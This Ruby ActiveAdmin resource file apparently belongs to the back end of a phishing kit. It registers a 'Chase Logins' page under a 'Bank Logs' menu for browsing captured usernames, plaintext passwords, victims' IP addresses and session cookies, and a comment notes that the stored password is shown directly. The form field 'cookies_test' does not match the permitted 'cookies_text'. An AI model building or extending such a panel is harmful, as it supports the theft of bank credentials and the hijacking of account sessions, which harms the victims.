ActiveAdmin.register Chaselogin do
    menu label: "Chase Logins", parent: "Bank Logs", priority: 2

  # See permitted parameters documentation:
  # https://github.com/activeadmin/activeadmin/blob/master/docs/2-resource-customization.md#setting-up-strong-parameters
  #
  # Uncomment all parameters which should be permitted for assignment
  #
  permit_params :username, :password, :ip_address, :cookies, :cookies_text
  #
  # or
  #
  # permit_params do
  #   permitted = [:username, :password, :ip_address, :cookies, :cookies_text]
  #   permitted << :other if params[:action] == 'create' && current_user.admin?
  #   permitted
  # end


  index do
    selectable_column
    id_column
    column :username
    column :password do |record|
      # Directly show the stored password
      record.password
    end
    column :ip_address
    column :created_at
    actions
  end

  show do
    attributes_table do
      row :username
      row :password
      row :ip_address
      row :cookies_text
      row :cookies
      row :created_at
      row :updated_at
    end
  end

  filter :username
  filter :ip_address
  filter :created_at

  
  form(:html => { :multipart => true }) do |f|
    f.inputs do
      f.input :username
      f.input :password
      f.input :cookies
      f.input :cookies_test
    end
    f.actions
  end

end
